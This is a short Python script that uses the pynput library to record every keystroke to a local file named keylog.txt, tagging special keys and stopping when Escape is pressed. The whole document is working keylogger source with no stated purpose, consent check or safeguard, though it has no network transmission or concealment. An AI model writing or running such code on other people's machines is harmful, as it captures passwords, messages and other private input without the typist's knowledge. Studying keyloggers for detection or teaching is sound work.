from pynput.keyboard import Key, Listener

# File to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log normal alphanumeric keys
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys (like space, enter, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" [SPACE] ")
            elif key == Key.enter:
                f.write(" [ENTER]\n")
            elif key == Key.backspace:
                f.write(" [BACKSPACE] ")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == Key.esc:
        return False

# Set up the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
